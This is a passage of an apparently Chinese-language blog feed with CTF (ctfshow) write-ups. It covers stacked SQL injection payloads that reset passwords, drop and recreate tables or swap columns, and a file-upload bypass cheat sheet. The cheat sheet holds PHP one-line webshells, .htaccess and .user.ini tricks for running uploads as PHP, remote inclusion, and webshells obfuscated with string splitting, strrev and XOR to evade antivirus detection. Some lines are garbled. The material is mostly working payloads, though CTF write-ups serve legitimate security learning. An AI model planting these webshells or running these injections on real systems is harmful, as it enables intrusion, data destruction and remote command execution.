punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'用户名非法'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"登陆成功 flag is <span class=\"token interpolation\"><span class=\"token variable\">$flag</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>可以使用修改表的方法</p>\n<p>payload</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">update</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>ctfshow_user<span class=\"token punctuation\">`</span></span><span class=\"token keyword\">set</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr></tbody></table></figure><p>将密码重置为 1</p>\n<h1 id=\"web-197\"><a class=\"anchor\" href=\"#web-197\">#</a> web 197</h1>\n<p>查询语句</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$<span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"select pass from ctfshow_user where username = {$username};\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>返回逻辑</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>preg_match<span class=\"token punctuation\">(</span><span class=\"token string\">'/\\*|\\#\\-|\\x23|\\'|\\\"|union|or|and|\\x26|\\x7c|file|into|select|update|set//i'</span><span class=\"token punctuation\">,</span>$username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>{</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'用户名非法'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    die<span class=\"token punctuation\">(</span>json_encode<span class=\"token punctuation\">(</span>$ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>}</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$<span class=\"token keyword\">row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token operator\">=</span> $password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>{</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"登陆成功 flag is $flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>}</pre></td></tr></tbody></table></figure><p>在这一题中，与前面相比过滤了 update，不能更新，分号还是可以用，即堆叠注入还是可以用，所以不妨直接删除表，然后创建相同名字、字段的表，而数据自己设置</p>\n<p>因此 payload 为</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">drop</span> <span class=\"token keyword\">table</span> ctfshow_user<span class=\"token punctuation\">;</span><span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> ctfshow_user<span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">insert</span> ctfshow_user<span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">,</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">value</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"web-198\"><a class=\"anchor\" href=\"#web-198\">#</a> web 198</h1>\n<p>相比于 197 而言，将 <code>drop</code>  和 <code>create</code>  过滤了</p>\n<p>这里可以使用交换列的方法 (前提是知道用户名是什么), 因为在交换了两列之后，查询语句就变为查询原来的 <code>pass</code>  列，而匹配的密码为原来的 <code>username</code>  列，而 <code>username</code>  是知道的，那么即可拿到 flag</p>\n<p>payload</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> ctfshow_user change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass2<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> ctfshow_user change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> ctfshow_user change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass2<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/592e5fba/",
            "url": "http://dpm12345.cn/posts/592e5fba/",
            "title": "文件上传",
            "date_published": "2022-10-04T14:14:40.000Z",
            "content_html": "<h1 id=\"情况\"><a class=\"anchor\" href=\"#情况\">#</a> 情况</h1>\n<ul>\n<li>\n<p>仅仅有前端验证，将前端代码删去一些</p>\n</li>\n<li>\n<p>后端仅验证后缀，改后缀</p>\n</li>\n<li>\n<p>后端仅验证 <code>content-type</code> ，改为可以上传的内容类型</p>\n</li>\n<li>\n<p>后端验证内容头，输入一个要求上传格式的内容头</p>\n</li>\n<li>\n<p>后端验证文件内容，如 <code>php</code>  过滤，可以使用短标签</p>\n</li>\n<li>\n<p>用户配置文件可以上传，采用 <code>auto_append_file=1.txt</code> ，(前提是有默认 <code>index.php</code>  可以打开) 然后在 <code>1.txt</code>  内容进行控制</p>\n</li>\n<li>\n<p>内容不允许有方括号，即普通的一句话木马不能上传，可以将方括号改为大括号</p>\n</li>\n<li>\n<p>一句话木马也可写成 <code>&lt;?php eval (array_pop ($_POST));?&gt;</code> , 同样也可</p>\n</li>\n<li>\n<p>过滤括号可以使用文件包含的，因为文件包含可以不写括号</p>\n</li>\n<li>\n<p>如果对某一字符串进行过滤，可以采用分开写的方式绕过，如日志包含过滤了 log，那么可以写成 <code>&lt;?=include '/var/l'.'og/nginx/access.l'.'og?&gt;</code></p>\n</li>\n<li>\n<p>空格过滤，可以使用换行代替（十六进制下用 <code>0d</code> ）</p>\n</li>\n<li>\n<p>过滤点号后，由于此时不能包含任何一个带点的文件 (如 log), 那么此时也可以使用远程 url 包含，先上传一个 <code>.user.ini</code>  自动加载没有点作为名字的文件，然后在该文件上传一个远程包含 url (其中 url 有一句话木马，该 url 为常地址不带点)，那么就可以 rce 了；另外也可以使用 session 包含竞争</p>\n</li>\n<li>\n<p>若无法上传出配置文件以外的文件 (即删除)，可以在配置文件中直接远程包含文件 (url)</p>\n</li>\n<li>\n<p>PNG 二次渲染</p>\n</li>\n<li>\n<p>jpg 二次渲染</p>\n</li>\n<li>\n<p>上传 <code>.htaccess</code>  文件，将某类型文件作为 php 文件读取</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>AddType application/x-httpd-php .png</pre></td></tr></tbody></table></figure><p>或者</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>&lt;FilesMatch \"png\"&gt; </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>SetHandler application/x-httpd-php </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&lt;/FilesMatch&gt;</pre></td></tr></tbody></table></figure><figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>&lt;script language='php'&gt;eval($_POST[cmd]);&lt;/script&gt;</pre></td></tr></tbody></table></figure></li>\n<li>\n<p>xxxxxxxxxx1&nbsp;1?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<p><strong>web 167-170</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"s#y#s#t#e#m\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"#\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1s'</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'ystem'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'metsys'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>更多的关于免杀</p>\n<ol>\n<li>\n<p>字符串拼接</p>\n</li>\n<li>\n<p>利用异或，使用其他符号构建字符串 如</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'!'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\"'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'#'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'$'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&amp;'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//ABCDEFG</span></pre></td></tr></tbody></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span>  <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$a</span></span>(<span class=\"token interpolation\"><span class=\"token variable\">$b</span></span>)\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$d</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//abcdefg</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$e</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//hijklmn</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">17</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">19</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//opqrst</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$g</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">21</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">23</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">25</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//uvwxyz</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$h</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'!'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\"'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'#'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'$'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&amp;'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//ABCDEFG</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token 